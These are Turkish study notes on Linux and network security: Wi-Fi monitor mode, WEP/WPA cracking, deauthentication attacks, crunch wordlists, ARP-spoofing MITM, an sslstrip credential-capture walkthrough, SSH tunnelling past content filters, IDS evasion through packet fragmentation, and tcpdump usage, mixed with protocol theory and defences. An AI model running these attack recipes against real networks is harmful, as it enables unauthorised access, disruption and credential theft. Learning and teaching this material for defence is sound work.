 








LINUX


















setxkbmap us(tr): Klavye dili değiştirir.

pwd: Hangi klasör içindeyiz onu gösterir.

ls: İçinde olduğumuz klasörün içinde görünen klasör ve dosyaları gösterir.

ls  -la: Ls’te görünmeyen detaylı dosyaları gösterir.

cd: Klasörün içine girmeye yarar.(cd Desktop/)

mkdir: Dizin içine yeni dosya açmaya yarar.

cd .. :Bir geri klasöre gider.

clear: Terminal ekranını temizler.

apt-get update: Linux sunucuna gerekli güncellemeleri yapar.

apt-get upgrade: Yapılan güncellemeleri sisteme yükler.

passwd: Şifreyi değiştirir.

ifconfig: ip’leri gösterir.

inet: İp’mizi gösterir.

ping google.com: İstenilen siteye ufak ufak istekler yapar, sitenin veya sunucunun bağlı olup olmadığını anlamamıza yarar.

unzip …. : Zipli dosyaları zip dosyası içinden çıkarır.

openvpn: İndirilen dosyayı (ovpn vs.) vpn’e bağlar.

cat: Herhangi bir dosyanın içeriğini okumamıza yarar. (cat/etc/resolv.conf=Kullanılan dns’i gösterir.)

nano: Txt, .c gibi veya başka uzantılı metin dizisi oluşturmamıza yarar.


MAC DEĞİŞTİRME
-ifconfig
  wlan0(ether=mac adı yazar)
-ifconfig wlan0down
-macchanger –random wlan0
-ifconfig wlan0up (MAC DEĞİŞMİŞ OLUR.)

DEĞİŞTİRDİKTEN SONRA MONİTÖR MODA GEÇMEK İÇİN;
-airmon-ng start wlan0(wlan0mon olduğu zaman monitör moda geçilmiş demektir.)

-iwconfig wlan0mod:Monitör modda olduğumuzu gösterir.
-airmon-ng stop wlan0mon(MONİTÖR MODU KAPATIR.)






MANUEL ŞEKİLDE MONİTOR MODA GEÇİŞ YAPIP – KAPATMAK
AÇMAK İÇİN
-ifconfig wlan0 down
-iwconfig wlan0mode monitör
-ifconfig wlan0 up
-iwconfig wlan0

KAPAMAK İÇİN
-ifconfig wlan0 down
-iwconfig wlan0mode managed
-ifconfig wlan0 up
-iwconfig wlan0

AĞLARI İNCELEMEK
-airodump-ng wlan0mon (ETRAFTA ULAŞABİLİR AĞLARI GÖSTERİR.)

-BSSID:MAC ADRESİDİR.  –PWR:SAYISI NE KADAR KÜÇÜKSE O KADAR YAKINDIR(-36 VS.)

	-BEACONS:SİNYAL.	 -#DATA:ELİMİZDE OLAN KULLANILABİLİR DATALAR.

	-CH:EN FAZLA KULLANILAN KANALI GÖSTERİR.     –ENC:VERİLERİN HANGİ ŞİFRELEME İLE ŞİFRELENDİĞİNİ GÖSTERİR.

	 ip_addr:Kendi adresimizi gösterir.

	BELLİ BİR AĞA ÖZEL BİLGİ EDİNMEK

	airodump-ng --channel (ch) --bssid (mac) –write test1 wlan0mon

Tarama tamamlanınca: ls test1 dosya gelir.(test1-01.cap uzantılı dosya gelir detaylı şekilde   incelenemesi yapılabilmesi için WİRESHARK uygulaması üzerinden açılıp bakılır.)

DEAUTHHENTICATION ATTACK (BELİRLİ KULLANICIYI AĞDAN ATMA)

aireplay-ng --deauth 1000(Gönderilecek saldırı sayısı) -a kendi bsssimiz -c station yerınde yazar wlan0mon


ŞİFRELEME MODELLERİ (ENCRYPTION/WEB/WPA/WPA2)
WEP CRACKING

-airodump-ng -channel <channel> -bssid <bssid> -write <file_name> <interface(mon0)>
-aircrack-ng <file_name>(aircrack-ng test01.cap) Şifreyi Bulunca[A1:B2:C3:D4](:’LARI KALDIR ŞİFRE)
 
WEP CRACKING-FAKE AUTH(SAHTE YETKİLENDİRME)
-aireplay-ng -fakeauth 0 -a <target-mac> -h <kali-mac> <interface>

-aireplay-ng --arpreplay -b <target-mac> -h <kali-mac> <interface>(ağa sızıp alıdığı paketleri enjekte eder.)


WPA SALDIRILARI(HANDSHAKE YAKALAMAK)
 	-airodump-ng --bssid <target-mac> --channel <channel> --write(isteğe bağlı) <interface>
	*Takibe alındığında kullanıcı girmesine beklenene kadar deauth saldırısı ile kendimizi          yetkilendirelim.

	WORDLIST YARATMAK(ŞİFRELERİN OLD. WORDLIST YARATIR)
            ./crunch <min> <max> <char> -t <pottern> - o file
	./crunch 8 10 123!é!’ -t m@@p -file wordlist

	
	BAĞLANTI SONRASI YAPILACAKLAR 
	-BAĞLANTI SONRASI AYARLAR-
 	DISCOVER
	-netdiscover -i <interface> -r <range>
	-netdiscover -i wlan0 -r 192.168.1.1/24

	NETDISCOVER 
	-netdiscover -r 10.0.2.10/24
	-nmap 10.0.2.0/24(daha detaylı sonuç)

	MAN IN THE MIDDLE(MITM)
	-arpspoof -i <interface> -t <target-IP> <AP-IP>
-arpspoof -i <interface> -t <AP-IP> <target-IP>

-arpspoof -i eth0 10.0.2.15 10.02.1
-arpspoof -i eth0(Başka birinin saldırı olacaksa wlan0 yazılır.) 10.0.2.1   10.0.2.15

*Windows’ta ipconfig yazınca mac adres ile altta diğer mac adresi aynıysa bir MITM saldırısı vardır.

MITM FREWORK(ALINAN VERİLERİN OKUNMASI)
-python mitm.py -i eth0 --arp --spoof --gateway 10.2.0.1(kendı-ip) --target 10.0.2.5
*Kendi pc’mizi sunucu olarak kullanabiliriz.
-start apache2 start(Linux içinde kendi sunucumuzu açar.Güncel ip ile.)(/var/www/html içindedir.)

-python kodunun sonuna --dns yazılınca dns saldırısı yapar.




BETTERCAP(yüklü değilse apt-get install bettercap)
-bettercap -iface eth0(kullanılan internet araç izi)
-net discover’da yaptığımız işleri yapmaya 

KABLOSUZ AĞ
Kablosuz Ağ Bağlanma Aşamaları Authentication(Kimlik doğrulama): Bir kullanıcı sisteminin AP’ye kimlik doğrulayarak ağa dahil olmasının ilk adımdır. Bu adımda iletilen frameler şifrelenmemektedir(Çünkü management framelerden birisidir). 2 çeşit kimlik doğrulama tanımlanmıştır: Open ve Shared Key.

 ● Open System Authentication: Bu tip kimlik doğrulamada istemciden içinde MAC adresinin olduğu bir istek gider ve AP’den isteğin kabul veya reddediğine dair bir cevap dönülür. 

● Shared Key Authentication: Kimlik doğrulama için ortak olarak bilinen bir anahtar(parola) kullanılır. Önce istemci AP’ye bir bağlantı isteğinde bulunur. AP kullanıcıya challenge text gönderir. İstemci bilinen anahtar bilgisiyle bu metini şifreler ve AP’ye gönderir. AP şifreli metini alır ve üzerinde belirlenen asıl anahtarla bu metinin şifresini çözer. Eğer şifresi çözülmüş olan metin, kullanıcıya ilk olarak gönderilen challenge text ile aynıysa parola doğru demektir. Kullanıcıya kimlik doğrulama için kabul veya ret içeren bir cevap dönülür.
Association (Ağa kayıt olma): İstemciler kimlik doğrulama adımını geçtikten sonra AP tarafından ağa kayıt edilmelidir(association). Bu işlem olmadan istemciden gelen/giden frameler AP tarafından yoksayılır. Bir istemci aynı anda sadece bir ağa kayıt olabilir ve kayıt işlemi sadece iletişim AP üzerinden gerçekleştiği Infrastructure modda gerçekleşir. İstemci association için bir istek gönderir, AP isteği değerlendirir ve olumlu yada olumsuz cevap döner. Eğer cevap olumluysa association cevabı içinde istemciyi daha sonra tanımak için atanan bir ID bulunur(Association ID(AID)).

 

WEP 
Hem şifreleme protokolünün hem de kimlik doğrulama işleminin adıdır. Bu güvenlik protokolünde ilk başlarda kısıtlamalardan dolayı 64 bitlik WEP key kullanılıyordu. 64 bitin, 24 biti verinin şifrelenmesi ve çözülmesi için kullanılan initialization vector(kısaca IV olarak anılır) ve 40 biti ise anahtardan(key) oluşur. Anahtar diye bahsedilen aslında o kablosuz ağ için girilen parola bilgisidir. 40 bitlik bir yer ayrıldığı için parola olarak en fazla 10 alfanumerik karakter kullanılabilir. Bu 64 bit, RC4 denilen kriptografik bir algoritmayla işleme sokulur ve başka bir değer elde edilir. Son olarak oluşturulan değer ve asıl veri XOR mantıksal işlemine sokulur. Böylece WEP koruması sağlanarak şifreli veri oluşturulur. Daha sonradan bazı kısıtlamalar kaldırılmış ve 128 bit,152 bit, 256 bit destekleyen WEP sistemleri bazı üreticiler tarafından sağlanmıştır. Bunlar içinde IV değeri 24 bittir.

 

WPA/WPA2 WEP üzerindeki ciddi güvenlik zafiyetleri dolayısıyla geçici bir çözüm olarak, 2003 yılında 802.11 veri güvenliğinde ve şifreleme metodundaki geliştirmelerle ortaya çıkmıştır. TKIP şifreleme metodunu kullanan WPA tanıtılmıştır. Bu sadece geçici bir çözümdür. 2004 yılında ise 802.11i yayınlanmıştır. Bu yeni standartta veri güvenliği için AES şifreleme algoritması ve CCMP şifreleme metodunun kullanıldığı WPA2 ortaya çıkmıştır. Kimlik doğrulama metodu için ise 802.1X(kurumsal) ve Preshared Key(PSK)(kişisel ve küçük ölçekli kullanım için) metotları geliştirilmiştir. WPA2’de parolanın doğrulanma aşaması 4’lü el sıkışmayla(4 way handshake) tamamlanır. WPA’da şifreleme metodu olarak TKIP kullanılmaktadır. AES-CCMP ve WEP’i de bazı durumlarda destekler. WEP’teki zafiyetlere karşı 3 güvenlik önlemi ile gelmiştir. ● Birincisi, anahtar ve IV, kriptografik algoritmaya tabi tutulmadan önce bir fonksiyona sokulur ve o şekilde gönderilir. WEP
’te ise bu işlem hatırlanacağı üzere 24 bitlik IV ve 40 bitlik anahtarın normal olarak birleştirilip RC4 algoritmasına sokuluyordu. ● İkincisi paketler için bir sıra numarası(sequence number) koyar. Böylece ardarda sahte istek gönderilmesi durumunda(replay attack) AP bu paketleri yoksayacaktır. ● Üçüncü olarak ise paketlerin bütünlüğünü kontrol etmek amacıyla 64 bitlik Message Integrity Check (MIC) eklenmiştir. WEP’te içeriği bilinen bir paket, şifre çözülmese dahi değiştirilebilir.
TKIP 
Büyük ölçüde WEP’e benzerlik göstermektedir. WEP üzerinde etkili olan bir çok ataktan etkilenir. Beck-Tews atak olarak bilinen bir yöntemle, çözülebilen bir paket başına 7-15 paket ağa enjekte edilebilir. Bu yöntemle ARP zehirleme, servis dışı bırakma gibi saldırılar gerçekleştirilebilir. Ancak bu işlem WPA parolasının ortaya çıkarılması manası taşımamaktadır.

CCMP CCMP, AES alınarak verilerin şifrelenmesi için tasarlanan bir şifreleme protokolüdür. WEP ve TKIP’ye göre daha güvenlidir. Güvenlik adına getirdiği yenilikler; ● Veri güvenliği: Sadece yetkili kısımlar tarafından erişilebilir. ● Kimlik doğrulama: Kullanıcının ‘gerçekliğini’ doğrulama olanağı verir ● Erişim kontrolü: Katmanlar arası bağlantı/yönetim geliştirilmiştir.

802.1x Kablolu ve kablosuz ağlar için IEEE tarafından belirlenen bir standarttır. Ağa dahil olmak isteyen cihazlar için port bazlı bir denetim mekanizmasıdır. Bu denetim kimlik doğrulama(authentication) ve yetkilendirme(authorization) adımlarını kapsar. 3 bileşenden oluşur: 1- Supplicant; ağa dahil olmak isteyen sistem, 2- Authenticator; genelde switch veya AP(erişim noktası) 3- Authentication server; RADIUS, EAP gibi protokolleri destekleyen bir yazılımdır. Bir kullanıcı ağa dahil olmak istediğinde kullanıcı adı/parola veya dijital bir sertifikayı authenticator’a gönderir. Authenticator’da bunu Authentication server’a iletir. İletim işleminde EAP metotları kullanılır. Özellikle kurumsal ağlarda yüzlerce, binlerce kullanıcı için sadece bir tane parola bilgisiyle ağa dahil etmek beraberinde başka sıkıntılarda getirebilir. Bu nedenle büyük ağlarda WPA - Enterprise kullanılır. Çalışanlar Active Directory/LDAP’tan kontrol edilen kullanıcı adı/parola bilgileriyle ağa dahil olabilirler. 

EAP(Extensible Authentication Protocol) EAP kimlik denetimi için bir çok metot barındıran bir protokoldür. EAP çatısı altında en bilinen metotlar; EAP-PSK, EAP-TLS, LEAP, PEAP. EAP çeşitleri EAP-TLS: Kablosuz ağlarda kimlik doğrulama için standart ve en güvenli metottur. Sertifika veya akıllı kart kullanılan ağlar için elzemdir. LEAP: Cisco tarafından geliştirilmiş bir kimlik doğrulama metodudur. MS-CHAP’ın değiştirilmiş bir versiyonu gibidir. Zafiyet barındıran bir metottur ve ancak güçlü bir parola ile kullanılmalıdır. Asleap adlı araç bu metodun istismarı için kullanılabilir. Yerini yine Cisco tarafından geliştirilen EAP-FAST’e bırakmıştır. PEAP: Sadece sunucu taraflı PKI sertifikasına ihtiyaç duyar. Kimlik doğrulama güvenliği için TLS tunel üzerinden bilgiler iletilir.



Kablosuz Ağlarda Güvenlik Önlemleri Kablosuz ağlardaki en temel güvenlik problemi verilerin hava ortamında serbestçe   dolaşmasıdır. Normal kablolu ağlarda switch kullanarak güvenlik fiziksel olarak sağlanabiliyor ve switch’e fiziksel olarak bağlı olmayan makinelerden korunmuş olunuyordu. Oysaki kablosuz ağlarda tüm iletişim hava ortamında kurulmakta ve veriler gelişigüzel ortalıkta dolaşmaktadır.

Erişim noktası Öntanımlı Ayarlarının Değiştirilmesi Kablosuz ağlardaki en büyük risklerden birisi alınan erişim noktası cihazına ait öntanımlı ayarların değiştirilmemesidir. Öntanımlı ayarlar erişim noktası ismi, erişim noktası yönetim konsolunun herkese açık olması, yönetim arabirimine girişte kullanılan parola ve şifreli ağlarda ağın şifresidir. Yapılan araştırmalarda kullanıcıların çoğunun bu ayarları değiştirmediği görülmüştür. Kablosuz ağların güvenliğine dair yapılması gereken en temel iş öntanımlı ayarların değiştirilmesi olacaktır.

Erişim Noktası İsmini Görünmez Kılma: SSID Saklama Kablosuz ağlarda erişim noktasının adını(SSID) saklamak alınabilecek ilk temel güvenlik önlemlerinden biridir. Erişim noktaları ortamdaki kablosuz cihazların kendisini bulabilmesi için devamlı anons ederler. Teknik olarak bu anonslara “beacon frame” denir. Güvenlik önlemi olarak bu anonsları yaptırmayabiliriz ve sadece erişim noktasının adını bilen cihazlar kablosuz ağa dahil olabilir. Böylece Windows, Linux da dahil olmak üzere birçok işletim sistemi etraftaki kablosuz ağ cihazlarını ararken bizim cihazımızı göremeyecektir. SSID saklama her ne kadar bir önlem olsa da teknik kapasitesi belli bir düzeyin üzerindeki saldırganlar tarafından rahatlıkla öğrenilebilir. Erişim noktasının WEP ya da WPA protokollerini kullanması durumunda bile SSID’lerini şifrelenmeden gönderildiğini düşünürsek ortamdaki kötü niyetli birinin özel araçlar kullanarak bizim erişim noktamızın adını her durumda öğrenebilmesi mümkündür.

Erişim Kontrolü Standart kablosuz ağ güvenlik protokollerinde ağa giriş anahtarını bilen herkes kablosuz ağa dahil olabilir. Kullanıcılarınızdan birinin WEP anahtarını birine vermesi/çaldırması sonucunda WEP kullanarak güvence altına aldığımız kablosuz ağımızda güvenlikten eser kalmayacaktır. Zira herkeste aynı anahtar olduğu için kimin ağa dahil olacağını bilemeyiz. Dolayısı ile bu tip ağlarda 802.1x kullanmadan tam manası ile bir güvenlik sağlanamayacaktır. 802.1x kullanılan ağlarda şu an için en büyük atak vektörü sahte kablosuz ağ yayınlarıdır.


MAC tabanlı erişim kontrolü Piyasada yaygın kullanılan erisim noktası(AP) cihazlarında güvenlik amaçlı konulmuş bir özellik de MAC adresine göre ağa dahil olmadır. Burada yapılan kablosuz ağa dahil olmasını istediğimiz cihazların MAC adreslerinin belirlenerek erisim noktasına bildirilmesidir. Böylece tanımlanmamış MAC adresine sahip cihazlar kablosuz ağımıza bağlanamayacaktır. Yine kablosuz ağların doğal çalışma yapısında verilerin havada uçuştuğunu göz önüne alırsak ağa bağlı cihazların MAC adresleri -ağ şifreli dahi olsa- havadan geçecektir, "burnu kuvvetli koku alan" bir hacker bu paketleri yakalayarak izin verilmiş MAC adreslerini alabilir ve kendi MAC adresini kokladığı MAC adresi ile değiştirebilir.




 
 



 

 
Yukarıdaki çıktıda SSL sertifika uyumsuzluğundan Firefox’un verdiği uyarılar serisi sıraadn bir kullanıcıyı bile sayfadan kaçıracak türdendir. Dikkatsiz, her önüne gelen linke tıklayan, çıkan her popup okumadan yes’e basan kullanıcılar için bu risk azalsa da hala devam ediyor ama bilinçli kullanıcılar bu tip uyarılarda daha dikkatli olacaklardır. Peki bilinçli kullannıcıların gözünden kaçabilecek ve HTTPS’I güvensiz kılabilecek başka açıklıklar var mıdır? Bu sorunun kısa cevabı evet, uzun cevabına gelecek olursak…


 
 
Firmaların neden sadece HTTPS kullanmadığı sorusuna verilecek en kısa cevap SSL’in sunucu tarafında ek kapasite gerektirmesidir. HTTP ile HTTPS arasındaki yük farkını görebilmek için aynı hedefe yapılmış iki farklı HTTP ve HTTPS isteğinin Wireshark gibi bir snifferla incelenmesi yeterli olacaktır. HTTP’de oturum bilgisi çoğunlukla cookie’ler üzerinden taşındığı düşünülürse eğer sunucu tarafında kod geliştirenler cookilere “secure” özelliği(cookielerin sadece güvenli bağlantı üzerinden aktarılması) eklememişlerse trafiği dinleyebilen birisi hesap bilgilerine ihtiyaç duymadan cookieler aracılığıyla sizin adınıza sistemlere erişebilir. Bunun için çeşitli yöntemler bulunmaktadır, internette “sidejacking” ve surfjacking anahtar kelimeleri kullanılarak yapılacak aramalar konu hakkında detaylı bilgi verecektir. Bu yazının konusu olmadığı için sadece bilinen iki yöntemin isimlerini vererek geçiyorum.
Göz Yanılgısıyla HTTPS Nasıl Devre Dışı Bırakılır? Bu yıl yapılan Blackhat konferanslarında dikkat çeken bir sunum vardı: New Tricks For Defeating SSL In Practice. Sunumun ana konusu yukarda anlatmaya çalıştığım HTTPS ile HTTP’nin birlikte kullanıldığı durumlarda ortaya çıkan riski ele alıyor. Sunumla birlikte yayınlanan sslstrip adlı uygulama anlatılanların pratiğe döküldüğü basit bir uygulama ve günlük hayatta sık kullandığımız banka, webmail, online alış veriş sitelerinde sorunsuz çalışıyor. Kısa kısa ssltrip’in nasıl çalıştığı, hangi ortamlarda tehlikeli olabileceği ve nasıl korunulacağı konularına değinelim.

SSLStrip Nasıl Çalışır? Öncelikle sslstrip uygulamasının çalışması için Linux işletim sistemine ihtiyaç duyduğu ve saldırganın MITM tekniklerini kullanarak istemcinin trafiğini üzerinden geçirmiş olması zorunlulugunu belirtmek gerekir. 
Şimdi adım adım saldırganın yaptığı işlemleri ve her adımın ne işe yaradığını inceleyelim; 
1.Adım: Saldırgan istemcinin trafiğini kendi üzerinden geçirir. Saldırgan istemcinin trafiğini üzerinden geçirdikten sonra trafik üzerinde istediği oynamaları yapabilir. Saldırgana gelen paketleri hedefe iletebilmesi için işletim sisteminin routing yapması gerekir. Linux sistemlerde bu sysctl değerleriyle oynayarak yapılabilir. (echo "1" > /proc/sys/net/ipv4/ip_forward) 
2. Adım: Saldırgan iptables güvenlik duvarını kullanarak istemciden gelip herhangi biryere giden tüm TCP/80 isteklerini lokalde sslstrip’in dinleyeceği 8000. Porta yönlendiriyor. İlgili Iptables komutu: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8000 
3.Adım)Saldırgan sslstrip uygulamasını çalıştırarak 8000.portu dinlemeye alıyor ve istemci ve sunucudan gelecek tüm istek-cevapları “topla” isimli dosyaya logluyor. #sslstrip -w topla --all -l 8000 –f Şimdi şöyle bir senaryo hayal edelim: Masum kullanıcı ailesiyle geldiği alışveriş merkezinde ücretsiz bir kablosuz ağ bulmuş olmanın sevinciyle mutlu bir şekilde gelip bilgisayarını açsın ve ilk yapacağı iş maillerini kontrol etmek olsun. Ortama dahil olmuş masum bir kullanıcının yaşadığı süreç şu şekilde olacaktır: İstemci ağa bağlanıp internete erişmek istediğinde ortamdaki saldırgan el çabukluğu marifetle istemcinin trafiğini üzerinen geçirir(ARP Cache poisoning yöntemiyle). 
İstemci durumdan habersiz webmail uygulamasına bağlanmak için sayfanın adresini yazar. Araya giren saldırgan sunucudan dönen cevaplar içerisinde HTTPS ile başlayan satırları HTTP ile değiştirir ve aynen kullanıcıya gönderir. Hiçbir şeyden haberi olmayan kullanıcı gelen sayfada kullanıcı adı/parola bilgilerini yazarak Login’I tıklar.

 

SSH Tünelleme ile İçerik Filtreleyicileri Atlatmak İşimiz, mesleğimiz gereği çeşitli ortamlarda bulunup internete erişmek, bazı programları (Google Talk, MSN vs)kullanmak istiyoruz fakat bazen bulunduğumuz ortamın şartları bu tip isteklerimize izin vermeyebiliyor . Bazen de herkese açık kablosuz bir ağ ortamında bulunduğumuz için güvenilir tüneller kullanma ihtiyacı hissediyoruz. Bu tip durumlarda genelde ağ yöneticisine durumu izah ederek bağlantı izni talep edilir. Ağ yöneticisine ulaşılamayacak durumlarda ya da ağ yöneticisini rahatsız etmeden işinizi kendiniz halletmek istediğinizde aşağıda anlatılanları uygulayarak çoğu içerik filtreleme (En popüleri Websense olmak uzere)sistemini atlatabilirsiniz. (Kablosuz ağ ortamlarında trafiğinizin izlenmemesi için de kullanılabilir) Benzer şekilde ağ guvenliği yöneticileri kendi ağlarında bu tip gizli tünellerin çalıştırılmasını istemeyebilir. Burada anlatılan yöntemlerin sisteminizde çalışmaması için yazının son bölümündeki “Nasıl Engellerim” başlıklı kısmı inceleyebilirsiniz. Icerik filtreleme sistemlerini atlatmak icin kullanacağımız yöntem SSH Tünelleme(SSH’in SOCKS proxy ozelligini kullanacagiz). 
Kısaca bilgilerimizi tazeleyelim: 
• SSH servisi öntanımlı olarak 22/TCP portunda çalışır ve istenirse değiştirilebilir.
 • Proxy’ler CONNECT metodu ile http olmayan çeşitli bağlantılara izin verirler. Mesela HTTPS. Bunun için genelde Proxy yapılandırmalarında 443 TCP portu dışarıya doğru açıktır.
 • SSH protokolü Proxy’lerin CONNECT yöntemini kullanarak ssh sunuculara bağlanabilirler. Bu yazıda kullanacağımız yöntem de 443. porttan çalışan SSH sunucusu bulup kendi sistemimiz ile bu sunucu arasında tunnel kurarak web trafiğimizi bu tünelden geçirmek. Arada gidip gelen veri şifreli olduğu için içerik filtreleme yazılımları bize engel çıkarmayacaktır.

FTP ve Güvenlik Duvarları FTP Protokolü FTP, sık kullanılan protokoller(HTTP, SMTP, DNS vs) arasında en sorunlu protokoldür. Diğer protokoller tek bir TCP/UDP portu üzerinden çalışırken FTP birden fazla ve dinamik portlarla çalışır. (IRC’deki veri transferi ve iletisim portu gibi). Bu portlardan biri “Command port” diğeri DATA port olarak adlandırılır. Command portu üzerinden ftp iletişimine ait gerekli temel bilgiler aktarılır. Temel bilgiler; ftp sunucuya gönderilecek kullanıcı adı ve parola bilgileri, ftp sunucuya hangi porttan bağlanılacağı, hangi ftp çeşidinin kullanılacağı gibi bilgiler olabilir. Data portu ise veri transferi amaçlı kullanılır.
 FTP Çeşitleri FTP iki çeşittir: pasif ve aktif FTP. Her ikisininde farklı amaçlı kullanımları mevcuttur. Hangi FTP çeşidinin kullanılacağı ftp istemcisi tarafından belirlenir.
 Aktif FTP Bu FTP çeşidinde istemci aktif rol alır. Bilinenin aksine orjinal ftp aktif ftpdir fakat günümüz internet altyapısında çeşitli sorunlara yol açtığı için pasif ftp daha fazla tercih edilmektedir. Aktif ftp de çıkan sorunlar pasif ftpnin geliştirilmesini sağlamıştır. Adım adım Aktif FTP;

 
1)istemci FTP sunucuya Command portundan(21) bağlanır. 
2)FTP sunucu gerekli karşılama mesajı ve kullanıcı adı sorgulamasını gönderir. -istemci gerekli erişim bilgilerini girer. -Sunucu erişimi bilgilerini kontrol ederek istemciye yanıt döner. Eğer erişim bilgileri doğru ise istemciye ftp komut satırı açılır. Burada istemci veri transferi yapmak istediğinde(ls komutunun çalıştırılması da veri transferi gerçekleştirir)3. adıma geçilir. -İstemci kendi tarafında 1024’den büyük bir port açar ve bunu PORT komutu ile FTP sunucuya bildirir. 
3)FTP sunucusu , istemcinin bildirdiği port numarasından bağlantı kurar ve gerekli aktarım işlemleri başlar. 
4) İstemci Onay mesaji gönderir.

 

 
 



Güvenlik Duvarlarında Yaşanabilecek FTP Sorunları 
Zaman zaman arkadaşlarınızın FTP ye bağlanıyorum ama ls çektiğimde bağlantı kopuyor ya da öylesine bekliyor dediğine şahit olmuşsunuzdur. Bu gibi istenmeyen durumlar FTP’nin karmaşık yapısı ve Firewall’ların protokolden anlamamasından kaynaklanır. 
Bir Firewall’da HTTP bağlantısını açmak için sadece 80. portu açmanız yeterlidir fakat FTP için 21. portu açmak yetmez.
 Bunun sebebi FTP’nin komutların gidip geldiği ve verinin aktığı port olmak üzere iki farklı port üzerinden çalışmasıdır.
 İlk port sabit ve bellidir:21. port fakat veri bağlantısının gerçekleştiği port olan diğer port kullanılacak ftp çeşidine (Aktif FTP veya PAsif FTP ) göre değişir ve eğer firewall FTP protokolünden anlamıyorsa genelde sorun yaşanır.
 Yeni nesil Firewall’larda bu sıkıntı büyük ölçüde giderilmiş olsa da ara ara eksik yapılandırmalardan aynı hataların yaşandığını görüyoruz. Linux Iptables’da ftp problemini aşmak için mod ip_conntrack_ftp modülünün sisteme yüklenmesi gerekir. OpenBSD Packet Filter ise bu tip aykırı protokoller için en uygun yapı olan proxy mantığını kullanır. FTP için ftp-proxy, upnp için upnp proxy, sip için sip-proxy vs. Aktif FTP ve Güvenlik Duvarı FTP istemcinin önünde bir Firewall varsa istemci kendi tarafında port açsa bile bu porta izin Firewall tarafından verilmeyeceği için problem yaşanacaktır.

 



 

TCP/IP Ağlarda Parçalanmış Paketler
Parçalanmış Paketler Parçalanmış paketler(Fragmented Packets) konusu çoğu network ve güvenlik probleminin temelini teşkil etmektedir. Günümüzde tercih edilen NIDS/NIPS(Ağ tabanlı Saldırı Tespit ve Engelleme Sistemleri) sistemleri bu konuya bir çözüm getirse de hala eksik kalan, tam anlaşılmayan kısımlar vardır. Bu sebepledir ki günümüzde hala parçalanmış paketler aracılığıyla yapılan saldırılara karşı korunmasız olan popüler IPS yazılımları bulunmaktadır[1]. IP parçalamanın ne olduğu, hangi durumlarda nasıl gerçekleştiği, ikinci bölümde IP parçalamanın ne tip güvenlik zaafiyetlerine sebep olabileceği konuların üzerinde duracağız.







 
 

 

 
 


 
 
 
Parçalanmış Paketler ve Saldırı Tespit Sistemleri 
Parçalanmış paketler konusunda en sıkıntılı sistemler IDS/IPS’lerdir. Bunun nedeni bu sistemlerin temel işinin ağ trafiği inceleme olmasıdır. Saldırı tespit sistemleri gelen bir paketin/paket grubunun saldırı içerikli olup olmadığını anlamak için çeşitli kontrollerden geçirir. Eğer bu kontrolleri geçirmeden önce paketleri birleştirmezse çok rahatlıkla kandırılabilir. Mesela HTTP trafiği içerisinde “/bin/bash” stringi arayan bir saldırı imzası olsun. IDS sistemi 80.porta gelen giden her trafiği inceleyerek içerisinde /bin/bash geçen paketleri arar ve bu tanıma uyan paketleri bloklar. Eğer IDS sistemimiz paket birleştirme işlemini uygun bir şekilde yapamıyorsa biz fragroute veya benzeri bir araç kullanarak /bin/sh stringini birden fazla paket olacak şekilde (1. Paket /bin, 2.paket /bash)gönderip IDS sistemini atlatabiliriz.

Snort ve Parçalanmış Paketler Açık kaynak kodlu IDS/IPS yazılımı Snort parçalanmış paketler için sağlam bir çözüm sunmaktadır. Snort ile birlikte frag3 önişlemcisi kullanılarak IDS sistemine gelen parçalanmış paketler detection engine(Snort’da kural karşilaştirmasinin yapildiği kısım)gelmeden birleştirilerek yapilmaya çalışılan ids atlatma tekniklerini işe yaramaz hale getirilebilir. Frag3 önişlemcisine ek olarak Stream5 önişlemcisi de kullanılarak stateful bir yapı kurulur. Bu ikili sağlıklı yapılandırılmazsa Snort bir çok saldırıya açık hale gelir ve gerçek işlevini yerine getiremez.

 
 
 

 








Sık Kullanılan Parametreler Arabirim Seçimi( -i ) 
Sistemimizde birden fazla arabirim varsa ve biz hangi arabirimini dinlemesini belirtmezsek tcpdump aktif olan ağ arabirimleri arasında numarası en düşük olanını dinlemeye alır, mesela 3 adet aktif Ethernet ağ arabirimimiz var; eth0, eth1, eth2[Linux için geçerlidir,diğer unix çeşitlerinde farklıdır, şeklinde biz bu makinede tcpdump komutunu yalın olarak kullanırsak tcpdump eth0 arabirimini dinlemeye alacaktır. Eğer ilk arabirimi değilde istediğimiz bir arabirimi dinlemek istiyorsak -i parametresi ile bunu belirtebiliriz 
# tcpdump -i eth2 komutu ile sistemimizdeki 3.Ethernet kartını dinlemeye alıyoruz. Sistemde bulunan ve tcpdump tarafından dinlemeye alınabilecek arabirimlerin listesini almak için –D parametresi kullanılabilir.
 [root@netdos1 ~]# tcpdump –D 
1.em0
 2.pflog0
 3.em1 
4.lo0

 İsim Çözümleme ( -n ) Eğer tcpdump ile yakalanan paketlerin dns isimlerinin çözülmesi istenmiyorsa -n parametresini kullanılabilir. Özellikle yoğun ağlarda tcpdump her gördüğü ip adresi-isim için dns sorgusu göndermeye çalışıp gelen cevabı bekleyeceği için ciddi yavaşlık hissedilir. 
Normal kullanım;
 # tcpdump 
17:18:21.531930 IP huzeyfe.32829 > erhan.telnet: S 3115955894:3115955894(0) win 5840 
17:18:21.531980 IP erhan.telnet > huzeyfe.32829: R 0:0(0) ack 3115955895 win 0

-n parametresi ile kullanım; 
# tcpdump -n 
17:18:53.802776 IP 192.168.0.100.32835 > 192.168.0.1.telnet: S 
3148097396:3148097396(0) win 5840 
17:18:53.802870 IP 192.168.0.1.telnet > 192.168.0.100.32835: R 0:0(0) ack 3148097397 win 0	

# tcpdump -nn 
yukarıda (-n için)verdiğimiz örnekte -n yerine -nn koyarsanız hem isim hemde port çözümlemesi yapılmayacaktır,yani telnet yerine 23 yazacaktır.

 -Zaman Damgası Gösterimi ( -t ) Eğer tcpdump'ın daha sade bir çıktı vermesini isteniyorsa ekrana bastığı satırların başındaki timestamp(zaman damgası, hangi paketin hangi zaman aralığında yakalandığını belirtir) kısmı iptal edilebilir. 
Çıktılarda timestamp[zaman damgası]leri istenmiyorsa -t parametresi kullanılabilir.
 




Yakalanan Paketleri Kaydetme ( -w ) 
Tcpdump'ın yakaladığı paketleri ekradan değilde sonradan incelemek üzere bir uygun bir şekilde dosyaya yazması istenirse -w parametresi kullanılabilir. Kaydedilen dosya cap uyumlu olduğu için sadece tcpdump ile değil birçok network snifferi tarafından okunup analiz edilebilir.
 # tcpdump -w dosya_ismi
 -r /Kaydedilmiş Paketleri Okuma
 -w ile kaydedilen paketler -r parametresi kullanılarak okunabilir.
 # tcpdump -r dosya_ismi 
